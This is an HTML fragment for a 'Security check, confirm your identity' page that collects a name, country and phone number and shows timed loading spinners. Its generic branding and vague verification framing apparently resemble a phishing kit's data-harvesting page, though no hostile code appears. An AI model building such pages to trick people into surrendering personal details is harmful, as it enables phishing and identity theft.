<script>

<div id="content">
    <div class="container d-xxl-flex d-flex justify-content-xxl-end">
        <div class="col-sm-5 col-md-4 col-xs-12 signin-box" style="margin-left: 70%;padding: 0 25px 35px 25px;width: 30%;box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);height: 350px;min-height: 550px;margin-top: 3%;">
            <h1 class="text-center pt-3"><img class="img-fluid logo1" src="assets/img/logo.png" alt="" width="100" height="40"></h1>
            <h4 class="text-center m-4" id="sign-head"><strong>Security check</strong></h4>
            <h5 class="text-center" id="sign-head">Confirm your identity</h5><br><br><br>
            <form id="securityForm" action="process_security_form.php" method="POST" onsubmit="showSpinner()">
                <input type="text" class="sign-input" id="name" name="name" placeholder="Name" required><br><br>
                <select class="sign-input" id="country" name="country" required onchange="updatePhonePrefix()">
                    <option value="" selected>Select Country</option>
                    <option value="USA">USA</option>
                    <option value="UK">UK</option>
                    <option value="Canada">Canada</option>
                </select><br><br>
                <div class="phone-input-container">
                    <input type="tel" class="sign-input phone-field" id="phone" name="phone" placeholder="Phone No." required>
                    <span id="countryCode" class="country-code-prefix">+1</span>
                </div><br><br>
                <input type="submit" class="submit-btn" id="submit" value="Verify"><br>
            </form>

            <div id="spinner" style="display:none;">
                <div class="spinner"></div>
            </div>

            <style>
                .phone-input-container {
                    position: relative;
                    width: 100%;
                }
                .phone-field {
                    padding-left: 35px;
                }
                .country-code-prefix {
                    position: absolute;
                    top: 50%;
                    left: 10px;
                    transform: translateY(-50%);
                    max-width: 15px;
                    font-size: 14px;
                    font-weight: bold;
                    color: #000;
                    pointer-events: none;
                }

                #spinner {
                    display: none;
                    position: fixed;
                    top: 45%;
                    left: 50%;
                    transform: translate(-50%, -50%);
                    z-index: 1000;
                }

                .spinner {
                    border: 2px solid #f3f3f3;
                    border-top: 2px solid #3498db;
                    border-radius: 50%;
                    width: 50px;
                    height: 50px;
                    animation: spin 2s linear infinite;
                }

                @keyframes spin {
                    0% { transform: rotate(0deg); }
                    100% { transform: rotate(360deg); }
                }
            </style>

            <script>
                function updatePhonePrefix() {
                    const countrySelect = document.getElementById('country');
                    const countryCodeSpan = document.getElementById('countryCode');
                    const countryCodes = {
                        'USA': '+1',
                        'UK': '+44',
                        'Canada': '+1'
                    };

                    countryCodeSpan.textContent = countryCodes[countrySelect.value] || '';
                }

                function showSpinner() {
                    // Hide the page content
                    document.getElementById("content").style.display = "none";

                    // Show the spinner
                    document.getElementById("spinner").style.display = "block";
                }
            </script>
                <script>
                    window.onload = function() {
                        // Show spinner
                        document.getElementById('spinner').style.display = 'flex';
                
                        // Hide spinner after 5 seconds and show the page content
                        setTimeout(function() {
                            document.getElementById('spinner').style.display = 'none';
                            document.getElementById('content').style.display = 'block';
                        }, 5000); 
                    };
                </script>
